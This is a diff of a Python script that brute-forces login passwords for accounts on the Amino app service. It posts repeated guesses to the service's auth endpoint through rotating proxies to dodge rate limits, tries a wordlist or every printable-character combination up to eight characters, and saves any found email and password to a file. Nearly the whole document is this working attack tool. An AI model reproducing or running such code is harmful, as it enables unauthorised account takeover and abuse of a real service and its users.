@@ -2,7 +2,19 @@ import requests
 import threading
 import time
 import random
+import sys
+import string
+import os
+
+try: import colorama
+except: print('You need to install dependency "colorama" from PIP ...'); exit()
+
+colorama.init()
+
 session = requests.session()
+
+def move (y, x):
+	print("\033[%d;%dH" % (y, x))
 
 try:
 	proxies = open('proxies.txt','r')
@@ -29,6 +41,13 @@ print('Proxy List Size: ' + str(length_proxies))
 
 emailIsVaild = False
 
+if sys.platform.startswith('linux'):
+	def clear():
+		os.system('clear')
+else:
+	def clear():
+		os.system('cls')
+
 global emailToUse
 emailToUse = ''
 while emailIsVaild == False:
@@ -40,15 +59,28 @@ while emailIsVaild == False:
 		break
 
 print('Your proxy list will be now be checked ...') 
-
+time.sleep(1)
+clear()
 global final_proxyCollection
 final_proxyCollection = []
 
 global deadProxies
 global aliveProxies
 
+global lastProxyThread
+
+lastProxyThread = ''
+
 deadProxies = 0
 aliveProxies = 0
+
+def proxyTestScreen():
+	clear()
+	print('Active Threads: ' + str(threading.active_count()))
+	print('Last Proxy Thread: ' + str(globals()['lastProxyThread']))
+	print('Alive Proxies: ' + str(globals()['aliveProxies']))
+	print('Dead Proxies: ' + str(globals()['deadProxies']))
+
 
 def testProxy (proxy):
 	proxy = proxy.replace('\n','')
@@ -57,38 +89,43 @@ def testProxy (proxy):
 		requests.get('http://www.google.com',proxies=_testProxy,timeout=2.5)
 		print('Found an alive proxy: ' + str(proxy))
 		globals()['aliveProxies'] += 1
-		print('Alive Proxies: ' + str(globals()['aliveProxies']))
-		print('Dead Proxies: ' + str(globals()['deadProxies']))
 		final_proxyCollection.append(proxy)
 		return {'proxy':proxy,'status':'alive'}
 	except:
 		print('Found Dead Proxy: ' +str(proxy))
 		globals()['deadProxies'] += 1
-		print('Alive Proxies: ' + str(globals()['aliveProxies']))
-		print('Dead Proxies: ' + str(globals()['deadProxies']))
 		return {'proxy':proxy,'status':'dead'}
 
 
-print('Testing for dead proxies ...')
+print('Checking proxy list ('+str(length_proxies)+' proxies) ...')
 for proxy in proxy_collection:
-	print('Testing Proxy: ' + str(proxy))
+	proxy = proxy.replace('\n','')
+	lastProxyThread = str(proxy)
 	t = threading.Thread(target=testProxy,args=(proxy,))
 
 	t.start()
-	time.sleep(.25)
+	time.sleep(.025)
 
-print('All threads have been created ...')
-print('Waiting 10 seconds for threads to finish up...')
-time.sleep(10)
 
-print('\n\nProxies Checked')
+while threading.active_count() > 1:
+	pass # hold the main thread until the threads finish up
+
+time.sleep(2)
+
+print('\n\nProxies Checked\n'+'-'*len('Proxies Checked'))
 print('Alive Proxies: ' + str(aliveProxies))
 print('Dead Proxies: ' + str(deadProxies))
 
-print('Brute force operation will begin in 15 seconds ...\nCancel now (CTRL+C) if you do not wish to continue with this')
-time.sleep(15)
 
-print('Brtue forcing now!\n\n\n\n\n\n\n...')
+while True:
+	try: method = int(input('Method (0 = Default, Any other number but 0 = Try Everything Mode): ')); break
+	except: print('The method wasn\'t entered correctly ...')
+
+print('Press ENTER / RETURN to Bruteforce ...')
+input()
+time.sleep(1)
+clear()
+
 
 #print(words_collection)
 
@@ -102,32 +139,31 @@ def amino_pass(proxy, password,email):
 	try:
 		while True:
 			try:
-				print('Attempt password try..')
+				#print('Attempt password try..')
 				rQ = requests.post('https://aminoapps.com/api/auth',json=_jsonData,proxies=_testProxy)
 				break
 			except:
-				print(final_proxyCollection)
+				#print(final_proxyCollection)
 				proxy = final_proxyCollection[random.randint(0,len(final_proxyCollection)-1)]
 				_testProxy = {'http':str('http://'+str(proxy)),'https':str('http://'+str(proxy))}
 	except:
-		print('[Thread with pass: ' +str(password)+'] Connection failed...')
+		#print('[Thread with pass: ' +str(password)+'] Connection failed...')
 		return False
 
 	try: 
 		rQ.json()['result']
 	except:
-		print(rQ.json())
-		print('[Thread with pass: ' +str(password)+'] Instant failure !'); 
+		#print(rQ.json())
+		#print('[Thread with pass: ' +str(password)+'] Instant failure !'); 
 		return False
 
-	print(rQ.json()['result'])
+	#print(rQ.json()['result'])
 
 	if 'nickname' in rQ.json()['result']:
 		print('Password was correct!')
 		passwordFound = open('password_result.txt','w+')
 		passwordFound.write(str(str(email)+':'+str(password)))
 		passwordFound.close()
-		print('\n\n\n\n\n!!!! PASSWORD FOUND !!!!')
 		print('PASSWORD = ' + str(password))
 		exit()
 		return True
@@ -139,20 +175,119 @@ def amino_pass(proxy, password,email):
 		exit()
 		return True
 	else:
-		print('Failed!')
+		print(str(password)+' --> Incorrect Password')
 		return False
 
+if method == 0:
+	for word in words_collection:
+		print('Attempting to use password: ' +str(word).replace('\n',''))
+		word = str(word).replace('\n','')
+		proxy = final_proxyCollection[random.randint(0,len(final_proxyCollection)-1)]
+		x = threading.Thread(target=amino_pass,args=(proxy,word,emailToUse,))
 
-for word in words_collection:
-	print('Attempting to use password: ' +str(word).replace('\n',''))
-	word = str(word).replace('\n','')
-	proxy = final_proxyCollection[random.randint(0,len(final_proxyCollection)-1)]
-	x = threading.Thread(target=amino_pass,args=(proxy,word,emailToUse,))
+		x.start()
+		time.sleep(0.075)
 
-	x.start()
-	time.sleep(1)
+	x.join()
+	print('Bruteforce Operation Completed!')
+	print('[INFO] Closing in 5 seconds ...')
+	time.sleep(5)
+else:
+	print('Password Crack Attempt with Length of 1 ...')
+	for i in range(0,len(list(string.printable))-1):
+		proxy = final_proxyCollection[random.randint(0,len(final_proxyCollection)-1)]
+		print('Attempting password: '+str(list(string.printable)[i]))
+		x = threading.Thread(target=amino_pass,args=(proxy,str(list(string.printable)[i]),emailToUse,))
 
-x.join()
-print('Finished')
-print('Waiting 25 seconds for remaining threads to finish...')
-time.sleep(25)
+		x.start()
+
+	print('Password Crack Attempt with Length of 2 ...')
+
+	for y in range(0,len(list(string.printable))-1):
+		for z in range(0,len(list(string.printable))-1):
+			proxy = final_proxyCollection[random.randint(0,len(final_proxyCollection)-1)]
+			print('Attempting password: '+str(list(string.printable)[y]+list(string.printable)[z]))
+			x = threading.Thread(target=amino_pass,args=(proxy,str(list(string.printable)[y]+list(string.printable)[z]),emailToUse,))
+
+			x.start()
+
+	print('Password Crack Attempt with Length of 3 ...')
+
+	for y in range(0,len(list(string.printable))-1):
+		for z in range(0,len(list(string.printable))-1):
+			for i in range(0,len(list(string.printable))-1):
+				proxy = final_proxyCollection[random.randint(0,len(final_proxyCollection)-1)]
+				print('Attempting password: '+str(list(string.printable)[y]+list(string.printable)[z]+list(string.printable)[i]))
+				x = threading.Thread(target=amino_pass,args=(proxy,str(list(string.printable)[y]+list(string.printable)[z]+list(string.printable)[i]),emailToUse,))
+
+				x.start()
+
+	print('Password Crack Attempt with Length of 4 ...')
+
+	for y in range(0,len(list(string.printable))-1):
+		for z in range(0,len(list(string.printable))-1):
+			for i in range(0,len(list(string.printable))-1):
+				for n in range(0,len(list(string.printable))-1):
+					proxy = final_proxyCollection[random.randint(0,len(final_proxyCollection)-1)]
+					print('Attempting password: '+str(list(string.printable)[y]+list(string.printable)[z]+list(string.printable)[i]+list(string.printable)[n]))
+					x = threading.Thread(target=amino_pass,args=(proxy,str(list(string.printable)[y]+list(string.printable)[z]+list(string.printable)[i]+list(string.printable)[n]),emailToUse,))
+
+					x.start()
+
+	print('Password Crack Attempt with Length of 5 ...')
+
+	for y in range(0,len(list(string.printable))-1):
+		for z in range(0,len(list(string.printable))-1):
+			for i in range(0,len(list(string.printable))-1):
+				for n in range(0,len(list(string.printable))-1):
+					for ii in range(0,len(list(string.printable))-1):
+						proxy = final_proxyCollection[random.randint(0,len(final_proxyCollection)-1)]
+						print('Attempting password: '+str(list(string.printable)[y]+list(string.printable)[z]+list(string.printable)[i]+list(string.printable)[n])+list(string.printable)[ii])
+						x = threading.Thread(target=amino_pass,args=(proxy,str(list(string.printable)[y]+list(string.printable)[z]+list(string.printable)[i]+list(string.printable)[n]+list(string.printable)[ii]),emailToUse,))
+
+						x.start()
+
+	print('Password Crack Attempt with Length of 6 ...')
+
+	for y in range(0,len(list(string.printable))-1):
+		for z in range(0,len(list(string.printable))-1):
+			for i in range(0,len(list(string.printable))-1):
+				for n in range(0,len(list(string.printable))-1):
+					for ii in range(0,len(list(string.printable))-1):
+						for yy in range(0,len(list(string.printable))-1):
+							proxy = final_proxyCollection[random.randint(0,len(final_proxyCollection)-1)]
+							print('Attempting password: '+str(list(string.printable)[y]+list(string.printable)[z]+list(string.printable)[i]+list(string.printable)[n])+list(string.printable)[ii]+list(string.printable)[yy])
+							x = threading.Thread(target=amino_pass,args=(proxy,str(list(string.printable)[y]+list(string.printable)[z]+list(string.printable)[i]+list(string.printable)[n]+list(string.printable)[ii]+list(string.printable)[yy]),emailToUse,))
+
+							x.start()
+
+	print('Password Crack Attempt with Length of 7 ...')
+
+	for y in range(0,len(list(string.printable))-1):
+		for z in range(0,len(list(string.printable))-1):
+			for i in range(0,len(list(string.printable))-1):
+				for n in range(0,len(list(string.printable))-1):
+					for ii in range(0,len(list(string.printable))-1):
+						for yy in range(0,len(list(string.printable))-1):
+							for zz in range(0,len(list(string.printable))-1):
+								proxy = final_proxyCollection[random.randint(0,len(final_proxyCollection)-1)]
+								print('Attempting password: '+str(list(string.printable)[y]+list(string.printable)[z]+list(string.printable)[i]+list(string.printable)[n])+list(string.printable)[ii]+list(string.printable)[yy]+list(string.printable)[zz])
+								x = threading.Thread(target=amino_pass,args=(proxy,str(list(string.printable)[y]+list(string.printable)[z]+list(string.printable)[i]+list(string.printable)[n]+list(string.printable)[ii]+list(string.printable)[yy]+list(string.printable)[zz]),emailToUse,))
+
+								x.start()
+
+	print('Password Crack Attempt with Length of 8 ...')
+
+	for y in range(0,len(list(string.printable))-1):
+		for z in range(0,len(list(string.printable))-1):
+			for i in range(0,len(list(string.printable))-1):
+				for n in range(0,len(list(string.printable))-1):
+					for ii in range(0,len(list(string.printable))-1):
+						for yy in range(0,len(list(string.printable))-1):
+							for zz in range(0,len(list(string.printable))-1):
+								for bb in range(0,len(list(string.printable))-1):
+									proxy = final_proxyCollection[random.randint(0,len(final_proxyCollection)-1)]
+									print('Attempting password: '+str(list(string.printable)[y]+list(string.printable)[z]+list(string.printable)[i]+list(string.printable)[n])+list(string.printable)[ii]+list(string.printable)[yy]+list(string.printable)[zz]+list(string.printable)[bb])
+									x = threading.Thread(target=amino_pass,args=(proxy,str(list(string.printable)[y]+list(string.printable)[z]+list(string.printable)[i]+list(string.printable)[n]+list(string.printable)[ii]+list(string.printable)[yy]+list(string.printable)[zz]+list(string.printable)[bb]),emailToUse,))
+
+									x.start()
